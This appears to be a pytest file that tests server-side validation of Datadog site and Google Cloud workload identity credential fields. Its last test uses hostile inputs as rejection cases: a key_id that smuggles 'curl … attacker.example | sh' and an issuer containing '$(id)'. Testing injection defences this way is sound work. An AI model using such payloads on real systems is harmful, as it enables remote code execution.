"""Server-side validation of provider-specific credential fields.

The Datadog site composes into intake/API URLs (an SSRF surface) and a bad
value otherwise only surfaces at ship time as a permanently-failing stream —
the allowlist must be enforced at credential save, not just in the console
picker.
"""

from unittest.mock import patch

import pytest
from graphql import GraphQLError

from backend.graphene.mutations.syncing import validate_credential_values

_KEYPAIR = (b"\x01" * 32, b"\x02" * 32)
_C = "api.utils.crypto"


def test_non_datadog_providers_are_untouched():
    with patch(f"{_C}.decrypt_asymmetric") as mock_decrypt:
        validate_credential_values("cloudflare", {"access_token": "enc"})

    mock_decrypt.assert_not_called()


def test_missing_site_is_rejected():
    with pytest.raises(GraphQLError, match="site is required"):
        validate_credential_values("datadog", {"api_key": "enc"})


def test_valid_site_passes_despite_scheme_and_case_noise():
    with patch(f"{_C}.get_server_keypair", return_value=_KEYPAIR), patch(
        f"{_C}.decrypt_asymmetric", return_value="https://US3.datadoghq.com/"
    ):
        validate_credential_values("datadog", {"site": "enc"})


def test_unknown_site_is_rejected():
    with patch(f"{_C}.get_server_keypair", return_value=_KEYPAIR), patch(
        f"{_C}.decrypt_asymmetric", return_value="logs.evil.example"
    ):
        with pytest.raises(GraphQLError, match="Unknown Datadog site"):
            validate_credential_values("datadog", {"site": "enc"})


def test_unreadable_site_ciphertext_is_rejected():
    with patch(f"{_C}.get_server_keypair", return_value=_KEYPAIR), patch(
        f"{_C}.decrypt_asymmetric", side_effect=Exception("bad ciphertext")
    ):
        with pytest.raises(GraphQLError, match="Could not read"):
            validate_credential_values("datadog", {"site": "enc"})



_M = "backend.graphene.mutations.syncing"
_GCP_PROVIDER = (
    "projects/123456789012/locations/global/workloadIdentityPools/phase/providers/phase"
)


def _gcp_identity(org_id="org-1"):
    import json

    from django.test import override_settings

    from api.utils.syncing.gcp.auth import generate_workload_identity_key

    with override_settings(OAUTH_REDIRECT_URI="https://console.phase.dev"):
        identity = generate_workload_identity_key(org_id)
    return {
        "workload_identity_provider": _GCP_PROVIDER,
        "issuer": identity["issuer"],
        "subject": identity["subject"],
        "key_id": identity["key_id"],
        "private_key": identity["private_key"],
        "jwks": json.dumps(identity["jwks"]),
    }


def _validate_gcp(plain, org_id="org-1"):
    """Run validation with each field "encrypted" as enc:<field>."""
    encrypted = {field: f"enc:{field}" for field in plain}
    with patch(f"{_M}.get_server_keypair", return_value=_KEYPAIR), patch(
        f"{_M}.decrypt_asymmetric",
        side_effect=lambda value, *_: plain[value.removeprefix("enc:")],
    ):
        return validate_credential_values("gcp", encrypted, org_id)


def test_gcp_credentials_need_every_field():
    fields = {field: "enc" for field in _gcp_identity() if field != "jwks"}
    with pytest.raises(GraphQLError, match="Missing Google Cloud credential fields: jwks"):
        validate_credential_values("gcp", fields, "org-1")


def test_gcp_identity_minted_for_the_org_passes():
    _validate_gcp(_gcp_identity())


def test_gcp_audience_form_of_the_provider_name_passes():
    plain = _gcp_identity()
    plain["workload_identity_provider"] = f"//iam.googleapis.com/{_GCP_PROVIDER}"
    _validate_gcp(plain)


def test_gcp_provider_name_must_be_well_formed():
    plain = _gcp_identity()
    plain["workload_identity_provider"] = "my-provider"
    with pytest.raises(GraphQLError, match="full provider name"):
        _validate_gcp(plain)


def test_gcp_identity_from_another_org_is_rejected():
    with pytest.raises(GraphQLError, match="belongs to a different organisation"):
        _validate_gcp(_gcp_identity(org_id="org-2"), org_id="org-1")


def test_gcp_subject_must_match_the_key_id():
    plain = _gcp_identity()
    plain["key_id"] = "0" * 32
    with pytest.raises(GraphQLError, match="different organisation"):
        _validate_gcp(plain)


def test_gcp_jwks_must_be_the_private_keys_public_half():
    plain = _gcp_identity()
    plain["jwks"] = _gcp_identity()["jwks"].replace(
        _gcp_identity()["key_id"], plain["key_id"]
    )
    other = _gcp_identity()
    plain["private_key"] = other["private_key"]
    with pytest.raises(GraphQLError, match="doesn't match its public key"):
        _validate_gcp(plain)


def test_gcp_unreadable_values_are_rejected():
    with patch(f"{_M}.get_server_keypair", return_value=_KEYPAIR), patch(
        f"{_M}.decrypt_asymmetric", side_effect=ValueError("Invalid ciphertext")
    ):
        with pytest.raises(GraphQLError, match="Could not read these Google Cloud credentials"):
            validate_credential_values(
                "gcp", {field: "enc" for field in _gcp_identity()}, "org-1"
            )


@pytest.mark.parametrize(
    ("field", "value"),
    [
        ("key_id", 'k" ; curl -s https://attacker.example/p | sh ; echo "'),
        ("key_id", "ABCDEF0123456789ABCDEF0123456789"),
        ("issuer", "https://console.phase.dev/$(id)"),
        ("issuer", "http://console.phase.dev"),
    ],
)
def test_gcp_identity_values_must_have_the_shapes_phase_mints(field, value):
    plain = _gcp_identity()
    plain[field] = value
    if field == "key_id":
        # Keep the subject consistent so only the shape check can fail.
        plain["subject"] = f"phase:org:org-1:key:{value}"
    with pytest.raises(GraphQLError, match="wasn't created by Phase"):
        _validate_gcp(plain)
